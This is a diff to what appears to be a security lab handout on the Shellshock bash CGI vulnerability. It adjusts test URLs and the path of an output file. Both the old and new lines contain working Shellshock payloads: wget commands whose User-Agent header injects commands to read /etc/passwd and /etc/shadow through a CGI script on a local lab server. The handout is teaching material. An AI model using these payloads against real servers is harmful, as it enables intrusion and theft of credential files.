@@ -88,7 +88,7 @@ Restart the apache server.
 
 ## Create a script to test cgi ##
 
-Create a simple "hello world" script in perl. Test it. Call this script `test.cgi` and place it in the `/usr/lib/cgi-bin` folder. Place it such that you can access it at [http://localhost/cgi-bin/test.cgi](http://localhost/cgi-bin/test.cgi) (if you are in the VM) or [http://localhost:3080/cgi-bin/test.cgi](http://localhost:3080/cgi-bin/test.cgi) (from the host machine) to test it.
+Create a simple "hello world" script in perl. Test it. Call this script `test.cgi` and place it in the `/usr/lib/cgi-bin` folder. Place it such that you can access it at [http://localhost:3080/cgi-bin/test.cgi](http://localhost:3080/cgi-bin/test.cgi) (from the host machine) to test it.
 
 ```perl
 #!/usr/bin/perl
@@ -114,7 +114,7 @@ whoami
 echo "End of the world"
 ```
 
-Test it.
+Test it at [http://localhost:3080/cgi-bin/test.bash](http://localhost:3080/cgi-bin/test.bash).
 
 **Question 5** What user is the one executing the scripts? (see the output of whoami above). Why does apache use that user?
 
@@ -135,7 +135,7 @@ Now we can try the attack.
 Using `wget` run:
 
 ```bash
-wget -O /tmp/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:3080/cgi-bin/test.bash
+wget -O ~/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:3080/cgi-bin/test.bash
 ```
 
 Test it. What do you get in `output.txt`?
@@ -145,7 +145,7 @@ Test it. What do you get in `output.txt`?
 Try it again.
 
 ```bash
-wget -O /tmp/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/shadow" http://localhost:3080/cgi-bin/test.bash
+wget -O ~/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/shadow" http://localhost:3080/cgi-bin/test.bash
 ```
 
 **Question 9** Explain why this attack didn't work.
